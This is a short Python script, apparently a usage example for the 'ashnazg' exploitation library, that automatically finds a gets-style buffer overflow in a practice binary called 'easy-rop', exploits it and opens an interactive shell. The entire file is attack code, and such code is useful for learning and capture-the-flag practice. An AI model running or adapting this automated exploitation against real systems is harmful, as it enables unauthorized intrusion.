import ashnazg

nazg = ashnazg.Ashnazg(binary="./easy-rop")

# find a vulnerable function
vuln = list(nazg.find_vulnerable_functions())[0]

# begin exploit
conn = nazg.connect()

# get the program to the vulnerable function
# input.
conn.navigate(vuln.entry())

# 'GETS' vulnerability can be applied immediately if
# Binary is neither PIE nor canary. This is
# automatically detected, but we explicitly assume
# it here.
conn.exploit(vuln)

# you have a shell
conn.interactive()
 
